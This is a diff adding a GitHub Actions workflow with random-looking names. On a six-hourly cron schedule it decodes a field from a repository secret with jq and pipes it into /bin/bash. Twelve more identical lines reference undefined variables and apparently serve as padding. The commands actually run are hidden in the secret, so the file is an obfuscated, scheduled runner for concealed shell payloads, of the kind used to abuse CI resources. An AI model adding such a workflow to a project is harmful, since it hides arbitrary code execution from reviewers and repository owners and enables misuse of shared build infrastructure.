@@ -1,0 +1,28 @@
+name: fengsidou0987
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '7 2/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: fengsidou0987
+        env:
+          mz0119: ${{ secrets.mz0119 }}
+        run: |
+          echo $mz0119 | jq -r .v6849 | /bin/bash
+          echo $sioz4259 | jq -r .m14997 | /bin/bash
+          echo $dh49 | jq -r .djle05018 | /bin/bash
+          echo $bevh555 | jq -r .aoml7 | /bin/bash
+          echo $bszo66694 | jq -r .jwku00 | /bin/bash
+          echo $ikd25896 | jq -r .omjpk67 | /bin/bash
+          echo $xj168 | jq -r .dt7447 | /bin/bash
+          echo $wikt1806 | jq -r .pyakr62853 | /bin/bash
+          echo $pv898 | jq -r .wa39026 | /bin/bash
+          echo $vqm71495 | jq -r .ehp404 | /bin/bash
+          echo $f08692 | jq -r .rrb8 | /bin/bash
+          echo $w4 | jq -r .gn2 | /bin/bash
+          echo $fpqp609 | jq -r .pdpzu8843 | /bin/bash
+
